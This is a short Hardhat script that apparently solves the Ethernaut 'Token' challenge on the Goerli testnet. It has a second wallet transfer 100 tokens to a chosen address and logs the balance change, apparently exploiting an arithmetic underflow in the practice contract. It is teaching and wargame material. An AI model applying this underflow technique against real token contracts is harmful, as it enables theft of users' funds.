const { ethers } = require("hardhat");

// Token address deployed with ethernaut
const TOKEN_ADDRESS = "0xd4B2633ce952FD639c958040Aac69C5dbcb7482d";

// User address where the tokens will be transferred
const address = "0xc109141f53821F175fC316FC4254Fb6559E935C7";

// Create a seconder account to execute the transfer
const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_RPC_URL);
const account2 = new ethers.Wallet(process.env.FAKE_KEY, provider);

async function main() {
    // Create deployed token contract's instance
    const tokenInstance = await ethers.getContractAt("Token", TOKEN_ADDRESS);

    // Check account balance before the transaction
    const tx = await tokenInstance.balanceOf(address);
    const txReceipt = await tx;
    console.log("balance before: ", txReceipt);

    // Connect to the contract with seconder account and execute the transaction to the address.
    const transferTx = await tokenInstance.connect(account2).transfer(address, 100);
    const transferTxReceipt = await transferTx;
    console.log("resp: ", transferTxReceipt);

    // Check balance again
    const tx2 = await tokenInstance.balanceOf(address);
    const txResponse2 = await tx2;
    console.log("balance after: ", txResponse2);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});